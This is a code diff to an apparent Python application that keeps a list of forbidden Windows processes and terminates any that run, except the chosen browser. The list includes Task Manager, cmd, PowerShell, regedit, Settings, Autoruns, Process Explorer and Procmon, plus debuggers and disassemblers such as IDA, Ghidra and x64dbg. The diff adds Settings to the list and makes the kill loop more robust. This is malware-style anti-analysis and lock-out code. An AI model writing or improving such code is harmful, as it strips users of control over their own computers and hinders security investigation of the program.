@@ -387,7 +387,7 @@ class App:
             "yandex.exe", "tlauncher.exe", "browser.exe", "rulauncher.exe", "java.exe", "javaw.exe",
             "iexplore.exe", "taskmgr.exe", "powershell.exe", "regedit.exe", "mmc.exe", "control.exe",
             "discord.exe", "steam.exe", "epicgameslauncher.exe", "battle.net.exe", "telegram.exe",
-            "viber.exe", "cmd.exe", "notepad.exe", "wordpad.exe", "WINWORD.exe", "WinStore.App.exe",
+            "viber.exe", "cmd.exe", "notepad.exe", "wordpad.exe", "WinStore.App.exe",
             "ida.exe", "ida64.exe", "x64dbg.exe", "x32dbg.exe", "ollydbg.exe", "windbg.exe",
             "windbgx.exe", "ghidra.exe", "radare2.exe", "cheatengine.exe", "immunitydebugger.exe",
             "procexp.exe", "procexp64.exe", "processhacker.exe", "processhacker2.exe", "procmon.exe",
@@ -398,18 +398,22 @@ class App:
             "msconfig.exe", "regedt32.exe", "autoruns.exe", "autorunsc.exe", "services.exe",
             "tasklist.exe", "systeminfo.exe", "whoami.exe", "net.exe", "ipconfig.exe",
             "hxd.exe", "hexedit.exe", "010editor.exe", "winhex.exe", "resourcehacker.exe",
-            "dnspy.exe", "ilspy.exe", "peid.exe", "cffexplorer.exe", "dependencywalker.exe"
+            "dnspy.exe", "ilspy.exe", "peid.exe", "cffexplorer.exe", "dependencywalker.exe",
+            "SystemSettings.exe"
         ]
         current = {
             "chrome": "chrome.exe",
             "edge": "msedge.exe",
             "firefox": "firefox.exe"
         }[self.browser_type]
-        for proc in psutil.process_iter(['pid', 'name']):
+        for proc in psutil.process_iter(['pid', 'name', 'exe']):
             try:
                 name = proc.info['name'].lower()
-                if name in forbidden and name != current:
-                    proc.terminate()
+                if name in [f.lower() for f in forbidden] and name != current:
+                    try:
+                        proc.terminate()
+                    except (psutil.AccessDenied, psutil.NoSuchProcess):
+                        continue
             except:
                 continue
 
